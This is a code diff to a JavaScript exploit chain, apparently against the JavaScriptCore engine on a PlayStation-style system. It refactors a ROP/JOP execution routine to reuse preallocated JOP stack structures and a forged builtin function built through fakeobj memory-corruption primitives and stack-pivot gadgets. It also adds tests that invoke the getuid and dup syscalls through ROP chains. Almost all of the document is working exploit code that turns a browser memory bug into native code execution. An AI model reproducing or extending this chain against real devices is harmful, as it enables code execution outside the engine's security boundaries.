@@ -645,6 +645,9 @@ var rop = {
   idx: 0,
   stack_addr: mem.malloc(0x5000),
   ret_buf_addr: mem.malloc(8),
+  jop_stack_store: mem.malloc(8),
+  jop_stack_addr: mem.malloc(0x6A),
+  fake_func: null,
   clear: function() {
     rop.idx = 0;
     
@@ -692,31 +695,28 @@ var rop = {
       rop.push(insts[i])
     }
 
-    var jop_stack_store = mem.malloc(8)
-    var jop_stack_addr = mem.malloc(0x6A)
+    // Reuse pre-allocated JOP structures
+    var jop_stack_base_addr = rop.jop_stack_addr.add(new BigInt(0, 0x22))
 
-    var jop_stack_base_addr = jop_stack_addr.add(new BigInt(0, 0x22))
-
-    mem.write8(jop_stack_addr, gadgets.POP_RSP_RET)
+    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
     mem.write8(jop_stack_base_addr, rop.stack_addr)
     mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x10)), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
     mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x18)), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
     mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x40)), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)
 
-    mem.write8(jop_stack_store, jop_stack_base_addr)
+    mem.write8(rop.jop_stack_store, jop_stack_base_addr)
 
-    var fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
+    // Create fake function only once
+    if (rop.fake_func === null) {
+      rop.fake_func = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
+    }
 
-    fake(0, 0, 0, mem.fakeobj(jop_stack_store))
+    rop.fake_func(0, 0, 0, mem.fakeobj(rop.jop_stack_store))
 
     // Restore leak_obj to valid state - JSC may access it
     leak_obj.obj = {}
 
-    // Don't free immediately - JSC may still have references
-    // mem.free(fake.executable)
-    // mem.free(jop_stack_store)
-    // mem.free(jop_stack_addr)
-
+    // Don't free - structures are reused across executions
     // Don't clear ROP stack either - JSC may still reference it
     // rop.clear()
   },
@@ -1021,6 +1021,65 @@ try {
             break
         }
 
+        // Test getuid syscall (0x18)
+        log("")
+        log("Testing getuid syscall...")
+        var getuid_wrapper = syscall_gadgets[0x18]
+
+        if (getuid_wrapper) {
+            var test_store_addr = mem.malloc(0x10)
+            var test_insts = []
+
+            // Call getuid wrapper (no arguments needed)
+            test_insts.push(getuid_wrapper)
+
+            // Store return value from RAX
+            rop.store(test_insts, test_store_addr, 1)
+
+            try {
+                rop.execute(test_insts, test_store_addr, 0x10)
+                var uid = mem.read8(test_store_addr.add(new BigInt(0, 8)))
+                log("getuid returned: " + uid.lo())
+                mem.free(test_store_addr)
+            } catch (e) {
+                log("ERROR: getuid test failed - " + e.message)
+                mem.free(test_store_addr)
+            }
+        } else {
+            log("WARNING: getuid wrapper not found in syscall_gadgets")
+        }
+
+        // Test dup syscall (0x29)
+        log("")
+        log("Testing dup syscall...")
+        var dup_wrapper = syscall_gadgets[0x29]
+
+        if (dup_wrapper) {
+            var dup_store_addr = mem.malloc(0x10)
+            var dup_insts = []
+
+            // Set RDI = 1 (stdout file descriptor)
+            dup_insts.push(gadgets.POP_RDI_RET)
+            dup_insts.push(new BigInt(0, 1))
+
+            // Call dup wrapper
+            dup_insts.push(dup_wrapper)
+
+            // Store return value from RAX
+            rop.store(dup_insts, dup_store_addr, 1)
+
+            try {
+                rop.execute(dup_insts, dup_store_addr, 0x10)
+                var new_fd = mem.read8(dup_store_addr.add(new BigInt(0, 8)))
+                log("dup(1) returned: " + new_fd.lo())
+                mem.free(dup_store_addr)
+            } catch (e) {
+                log("ERROR: dup test failed - " + e.message)
+                mem.free(dup_store_addr)
+            }
+        } else {
+            log("WARNING: dup wrapper not found in syscall_gadgets")
+        }
 
     } else {
         log("ERROR: sceKernelGetModuleInfoFromAddr failed with code: " + ret_val.lo())
